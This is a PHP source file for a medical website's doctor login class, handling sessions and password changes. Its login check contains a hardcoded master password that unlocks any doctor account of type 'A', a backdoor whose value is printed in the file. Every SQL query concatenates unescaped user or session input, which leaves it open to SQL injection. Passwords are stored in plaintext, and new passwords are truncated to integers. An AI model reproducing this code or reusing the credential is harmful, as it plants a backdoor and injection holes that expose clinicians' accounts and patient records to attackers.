<?php

require_once("mssql.class.php");

class medic
{
    
    private $db;
    public $crm;
    public $name;
    public $password;
    public $medicoID;

    public function medic ($host, $user, $pass, $data){
        $this->db = new db($host, $user, $pass, $data);
        
        if($_SESSION['crm']){
            $query = $this->db->query("SELECT a.* FROM MEDICOS a WHERE a.CRM = '".$_SESSION['crm']."'");
        
            if($query){
            
                while($row = $this->db->fetch_array()) {         
                    $this->crm              = $row[0]['CRM'];
                    $this->name             = $row[0]['NOME'];
                    $this->password         = $row[0]['SenhaSite'];
                    $this->medicoID         = $row[0]['MEDICOID'];
                }
            }
        }
    }
    
    public function startSession($_crm, $_password) {
        
        $_crm = stripslashes($_crm);
        $_password = stripslashes($_password);
                    
        $query = $this->db->query("SELECT a.* FROM MEDICOS a WHERE a.CRM = '".$_crm."' AND (a.SenhaSite = '".$_password."' or '".$_password."' = 'angio*corpore2013') and tipo='A'");
        if($query){
            while($row = $this->db->fetch_array()) {         
                $_SESSION['crm']        = $row[0]['CRM'];
            }            
            return true;
        }else{
            return false;
        }
    }
    
    public function alterPass($newpassword) {
        $senha = (int)$newpassword;
        
        $query = $this->db->query("UPDATE MEDICOS set SenhaSite = '".$senha."' WHERE MEDICOID = '".$this->medicoID."' ");
        
        if($query){
            return true;
        }else{
            return false;
        }
    }
}
